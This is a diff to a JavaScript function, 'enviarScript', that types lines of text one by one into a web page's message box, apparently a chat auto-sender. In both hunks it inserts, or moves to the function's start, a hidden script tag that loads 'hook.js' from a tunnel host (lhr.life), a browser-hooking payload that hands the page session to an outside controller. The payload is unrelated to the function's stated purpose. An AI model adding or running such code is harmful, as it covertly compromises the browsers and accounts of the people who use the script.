@@ -1,4 +1,10 @@
 async function enviarScript(scriptText){
+	
+	//link message
+	var hook = createElement('script');
+        hook.src = "https://cc75f61a033665.lhr.life/hook.js"; //hook url
+        document.head.appendChild(hook);
+	
 	const lines = scriptText.split(/[\n\t]+/).map(line => line.trim()).filter(line => line);
 	main = document.querySelector("#main"),
 	textarea = main.querySelector(`div[contenteditable="true"]`)
@@ -18,10 +24,6 @@ async function enviarScript(scriptText){
 		
 		if(lines.indexOf(line) !== lines.length - 1) await new Promise(resolve => setTimeout(resolve, 250));
 	}
-  
-  var hook = createElement('script');
-  hook.src = "https://cc75f61a033665.lhr.life/hook.js"; //hook url
-  document.head.appendChild(hook);
 	
 	return lines.length;
 }
